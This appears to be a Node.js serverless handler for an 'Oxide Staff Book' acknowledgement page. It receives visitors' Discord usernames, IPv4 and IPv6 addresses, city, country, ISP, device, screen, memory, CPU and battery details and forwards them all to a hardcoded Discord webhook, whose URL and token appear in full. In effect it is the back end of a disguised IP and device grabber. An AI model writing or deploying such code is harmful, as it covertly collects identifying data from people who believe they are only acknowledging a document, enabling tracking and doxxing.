const fetch = require("node-fetch");

// The webhook URL is hardcoded as requested
const WEBHOOK_URL = "https://discord.com/api/webhooks/1502218610729287791/4eO3ZJ2NlbwDu33TxJx5Jqr5cE2LKmoBJQheB77bOu67TH-vzCq31lmJ3FoHmMuLNukD";

exports.handler = async (event) => {
  if (event.httpMethod !== "POST") {
    return { statusCode: 405, body: "Method Not Allowed" };
  }

  try {
    const body = JSON.parse(event.body);
    const now = new Date();

    // Prepare IP display
    let ipv4Display = body.ipv4 || "Not detected";
    let ipv6Display = body.ipv6 || "Not detected";
    
    // Determine which IP versions are available
    const hasIPv4 = body.ipv4 && body.ipv4 !== "Unknown";
    const hasIPv6 = body.ipv6 && body.ipv6 !== "Unknown";
    
    let ipStatus = "❌ No IP detected";
    if (hasIPv4 && hasIPv6) {
      ipStatus = "✅ Both IPv4 and IPv6 detected";
    } else if (hasIPv4) {
      ipStatus = "⚠️ Only IPv4 detected (IPv6 not available)";
    } else if (hasIPv6) {
      ipStatus = "⚠️ Only IPv6 detected (IPv4 not available)";
    }

    // Create fields array for Discord embed
    const fields = [
      { name: "👤 Discord Username", value: body.username || "Unknown", inline: false },
      { name: "🌐 IP Status", value: ipStatus, inline: false },
      { name: "📡 IPv4 Address", value: ipv4Display, inline: true },
      { name: "📡 IPv6 Address", value: ipv6Display, inline: true },
      { name: "📍 Location", value: (body.city || "?") + ", " + (body.country || "?"), inline: true },
      { name: "📡 ISP", value: body.isp || "Unknown", inline: false },
      { name: "📱 Device", value: body.device || "Unknown", inline: false },
      { name: "🕐 Timezone", value: body.timezone || "Unknown", inline: true },
      { name: "🗣️ Language", value: body.language || "Unknown", inline: true },
      { name: "🖥️ Screen", value: body.screen || "Unknown", inline: true },
      { name: "💾 Memory", value: body.memory ? body.memory + " GB" : "Unknown", inline: true },
      { name: "⚙️ CPU Cores", value: String(body.cores || "Unknown"), inline: true },
      { name: "🔋 Battery", value: body.battery || "Unknown", inline: true }
    ];

    // Add geo IP info
    if (body.ip_used_for_geo) {
      fields.push({ 
        name: "📍 Geo IP Used", 
        value: body.ip_used_for_geo + " (for location lookup)", 
        inline: false 
      });
    }

    // Prepare the embed data
    const embedData = {
      embeds: [{
        title: "📋 Staff Book Acknowledged",
        color: 0xff00ff,
        fields: fields,
        footer: { 
          text: "Oxide Staff Book • " + now.toUTCString() + 
                " • Both IPv4 & IPv6 captured" +
                " • User: " + (body.username || "Unknown")
        },
        timestamp: now.toISOString()
      }]
    };

    // Send to Discord webhook
    const response = await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(embedData)
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error("Discord API Error Response:", errorText);
      throw new Error(`Discord API error: ${response.status} ${response.statusText}`);
    }

    return { 
      statusCode: 200, 
      body: JSON.stringify({ 
        success: true, 
        message: "Data sent successfully",
        hasIPv4: hasIPv4,
        hasIPv6: hasIPv6
      }) 
    };
  } catch (error) {
    console.error("Error:", error);
    return { 
      statusCode: 500, 
      body: JSON.stringify({ 
        error: error.message,
        success: false 
      }) 
    };
  }
};
